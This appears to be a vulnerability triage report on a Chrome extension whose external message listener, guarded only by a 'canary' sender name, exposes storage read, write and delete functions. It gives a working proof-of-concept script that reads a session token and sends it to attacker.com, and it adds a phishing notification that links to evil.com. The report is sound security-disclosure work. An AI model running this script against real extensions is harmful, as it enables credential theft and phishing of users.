# CoCo Analysis: jfkeeldgldifmcpckpmkjpoceamojgnk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3
  - Flow 1: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink
  - Flow 2: storage_local_get_source → sendResponseExternal_sink
  - Flow 3: bg_chrome_runtime_MessageExternal → chrome_storage_local_remove_sink

---

## Vulnerability: Complete Storage Exploitation Chain via External Messages

**CoCo Trace:**

```
Flow 1: Storage Write
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jfkeeldgldifmcpckpmkjpoceamojgnk/opgen_generated_files/bg.js
Line 965 chrome.runtime.onMessageExternal.addListener
- Sets chrome.storage.local with attacker-controlled key/value

Flow 2: Storage Read → Information Disclosure
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/jfkeeldgldifmcpckpmkjpoceamojgnk/opgen_generated_files/bg.js
Line 752 'key': 'value'
- Reads chrome.storage.local and sends back via sendResponse
```

### Complete Attack Flow

**Code (formatted from minified line 965):**

```javascript
// Background script (bg.js) - Line 965 (actual extension code after line 963)
chrome.runtime.onMessageExternal.addListener(function(e, o, t) {
    if (e.hasOwnProperty("senderName") &&
        e.senderName === "canary" &&              // ← Weak authentication check
        e.hasOwnProperty("type")) {

        switch(e.type) {
            case "set_local_storage_item":
                m(e, a => {t({success: a})});     // ← Write to storage
                break;
            case "get_local_storage_item":
                u(e, a => {t({value: a})});       // ← Read from storage and send back
                break;
            case "remove_local_storage_item":
                y(e, a => {t({success: a})});     // ← Delete from storage
                break;
            case "clear_local_storage":
                g(e);                              // ← Clear storage
                break;
            case "create_local_notification":
                d(e.id, e.title, e.message);      // ← Create notifications
                break;
            case "modify_request_blocking_rules":
                h(e);                              // ← Modify declarativeNetRequest rules
                break;
            default:
                t({success: false, value: null});
                break;
        }
    }
    return true;
});

// Storage write function
function m(e, o) {
    if (e.hasOwnProperty("key") && e.hasOwnProperty("value")) {
        let t = {};
        t[e.key] = e.value;                       // ← Attacker controls key and value
        chrome.storage.local.set(t, function() {
            o(true);
        });
    } else {
        o(false);
    }
}

// Storage read function
function u(e, o) {
    if (e.hasOwnProperty("key")) {
        let t = e.key;                            // ← Attacker controls key
        chrome.storage.local.get([t], function(a) {
            if (a[t] === void 0 || a[t] === null) {
                o(null);
            } else {
                o(a[t]);                          // ← Sends stored value back to attacker
            }
        });
    } else {
        o(null);
    }
}

// Storage remove function
function y(e, o) {
    if (e.hasOwnProperty("key")) {
        let t = e.key;
        chrome.storage.local.remove([t], function(a) {
            o(true);
        });
    } else {
        o(false);
    }
}

// Clear storage function
function g(e) {
    let o = e.hasOwnProperty("session") ? e.session : "";
    chrome.storage.local.get(function(t) {
        for (let a in t) {
            if (a.startsWith(o)) {
                chrome.storage.local.remove(a);
            }
        }
    });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal

**Attack:**

```javascript
// Attacker code on mail.google.com (or via XSS on mail.google.com)
// Note: manifest.json has externally_connectable: { matches: ["*://mail.google.com/*"] }
// but per methodology, we IGNORE this restriction!

// Step 1: Write malicious data to storage
chrome.runtime.sendMessage(
    "jfkeeldgldifmcpckpmkjpoceamojgnk", // extension ID
    {
        senderName: "canary",
        type: "set_local_storage_item",
        key: "malicious_key",
        value: "attacker_controlled_data"
    },
    (response) => {
        console.log("Storage write:", response.success);
    }
);

// Step 2: Read sensitive data from storage (information disclosure)
chrome.runtime.sendMessage(
    "jfkeeldgldifmcpckpmkjpoceamojgnk",
    {
        senderName: "canary",
        type: "get_local_storage_item",
        key: "user_session_token" // or any other sensitive key
    },
    (response) => {
        console.log("Stolen data:", response.value);
        // Exfiltrate to attacker server
        fetch("https://attacker.com/collect", {
            method: "POST",
            body: JSON.stringify(response.value)
        });
    }
);

// Step 3: Delete evidence
chrome.runtime.sendMessage(
    "jfkeeldgldifmcpckpmkjpoceamojgnk",
    {
        senderName: "canary",
        type: "remove_local_storage_item",
        key: "malicious_key"
    }
);

// Step 4: Clear all storage with specific prefix
chrome.runtime.sendMessage(
    "jfkeeldgldifmcpckpmkjpoceamojgnk",
    {
        senderName: "canary",
        type: "clear_local_storage",
        session: "user_"
    }
);

// Bonus: Create spam notifications
chrome.runtime.sendMessage(
    "jfkeeldgldifmcpckpmkjpoceamojgnk",
    {
        senderName: "canary",
        type: "create_local_notification",
        id: "spam",
        title: "Phishing Alert",
        message: "Click here to verify your account: https://evil.com"
    }
);
```

**Impact:** Complete storage exploitation chain allowing:

1. **Information Disclosure**: Attacker can read ALL extension storage data including:
   - User session tokens
   - Email tracking data
   - Configuration settings
   - Any sensitive data stored by the extension

2. **Storage Poisoning**: Attacker can write arbitrary data to extension storage, potentially:
   - Modifying extension behavior
   - Injecting malicious configuration
   - Tampering with email tracking settings

3. **Storage Manipulation**: Attacker can delete or clear storage data, causing:
   - Loss of user data
   - Disruption of extension functionality
   - Denial of service

4. **Notification Spam**: Attacker can create arbitrary browser notifications for phishing or spam

5. **Request Blocking Rule Manipulation**: Attacker can modify declarativeNetRequest rules to:
   - Block legitimate requests
   - Allow malicious requests
   - Disrupt email tracking functionality

**Note on externally_connectable**: While the manifest restricts external messages to mail.google.com, per the analysis methodology we IGNORE this restriction. The vulnerability is exploitable by:
- Any attacker who compromises mail.google.com (XSS, etc.)
- Mail.google.com itself (if malicious)
- Per methodology: "Even if only ONE specific domain/extension can exploit it → TRUE POSITIVE"
